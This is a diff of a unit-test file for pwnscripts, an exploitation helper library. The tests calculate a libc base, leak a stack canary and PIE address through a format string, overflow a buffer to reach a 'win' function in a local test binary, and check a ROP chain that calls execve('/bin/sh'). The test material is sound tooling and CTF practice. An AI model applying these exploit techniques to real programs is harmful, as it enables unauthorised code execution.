@@ -8,6 +8,7 @@ showing off common use-cases and best practices.
 import unittest as ut
 # Unfortunately, pytest interprets every `test.*` function as a testable function, so no import * here
 from pwnscripts import context, log, fsb, unpack_hex, fmtstr_payload, is_wsl, unpack_many_hex, pack, libc, ELF, ROP
+import pwnscripts.elf
 from os import system, path
 from subprocess import CalledProcessError
 
@@ -42,9 +43,10 @@ class BinTests(ut.TestCase):
 
         lib = context.libc  # Just to shorten (.) usage
         orig_binsh = lib.symbols['str_bin_sh']
-        lib.calc_base('scanf', 0x7fffa3b8b040)      # Test this func
-        assert lib.address == 0x7fffa3b10000		# Make sure address was set
+        lib.symbols['scanf'] = 0x7fffa3b8b040   # Automatically calculate libc base! formerly calc_base('scanf', 0x7fffa3b8b040)
+        assert lib.address == 0x7fffa3b10000    # Make sure address was set
         assert lib.symbols['str_bin_sh'] == lib.address + orig_binsh	# ELF inherited property
+        assert isinstance(lib.symbols, pwnscripts.elf._SymbolDict)  # Make sure that the ELF monkeypatching is working
         context.clear() # Ensure that libc does not affect future tests
  
     def test_C_printf_buffer_bruteforce(self):
@@ -100,7 +102,6 @@ class BinTests(ut.TestCase):
             context.binary = '3.out'    # that isn't available inside a hypothetical with: statement.
             context.log_level = 'info'
             main = context.binary.symbols['main']
-            win = context.binary.symbols['win']
 
             @context.quiet
             def printf(l:str):
@@ -115,9 +116,10 @@ class BinTests(ut.TestCase):
             r = context.binary.process()
             r.sendline('%{}$p,%{}$p'.format(canary_off, main_off))
             canary, pie_leak = unpack_many_hex(r.recvline())
+            context.binary.symbols['main'] = pie_leak   # this will auto-update all PIE addresses
             payload = b'A'*(canary_off-buffer)*context.bytes
             payload+= pack(canary).ljust(2*context.bytes)   # unfortunate magic number
-            r.sendline(payload + pack(pie_leak-main+win))
+            r.sendline(payload + pack(context.binary.symbols['win']))
             self.assertEqual(r.recvline().strip(), b'flag{NiceOne}')
         finally:
             system('rm 3.out')
@@ -161,5 +163,7 @@ class BinTests(ut.TestCase):
         "0x0040:              0x0 [arg3] rdx = 0\n"
         "0x0048:       0x10000000 SYS_execve\n"
         "0x0050:   b'/bin/sh\\x00'")
+
+# TODO: printf cache testing
 if __name__ == '__main__':
     ut.main()
